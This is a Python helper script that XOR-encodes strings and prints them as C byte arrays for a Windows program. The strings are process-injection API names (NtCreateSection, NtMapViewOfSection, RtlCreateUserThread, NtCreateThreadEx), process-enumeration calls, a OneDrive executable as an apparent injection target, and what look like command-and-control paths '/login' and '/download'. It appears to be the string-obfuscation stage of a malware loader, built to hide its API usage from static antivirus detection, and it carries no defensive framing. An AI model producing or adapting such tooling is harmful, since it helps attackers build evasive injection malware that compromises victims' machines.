import os

KEY = "ABCDEFG1234"

def xor(data, key):
    key = str(key)
    l = len(key)
    output_bytes = bytearray()

    for i in range(len(data)):
        current = data[i]
        current_key = key[i % l]
        output_bytes.append(current ^ ord(current_key))
    
    return output_bytes

str_list = [b"NTDLL", b"NtCreateSection", b"NtMapViewOfSection", b"NtUnmapViewOfSection", b"NtClose", b"RtlCreateUserThread", b"C:\\Users\\administrator\\AppData\\Local\\Microsoft\\OneDrive\\onedrive.exe", b"NtCreateThreadEx", b"onedrive.exe", b"KERNEL32.DLL", b"OpenProcess", b"CreateToolhelp32Snapshot", b"Process32First", b"Process32Next", b"lstrcmpiA", b"WaitForSingleObject", b"CreateProcessA", b"ResumeThread", b"/login", b"/download"]

print('char xorkey[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in KEY) + ' };')

for s in str_list:
    ciphertext = xor(s + b"\x00", KEY)
    rext = s.decode('utf-8').split('.')[0]
    print('char s' + rext + '[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };')
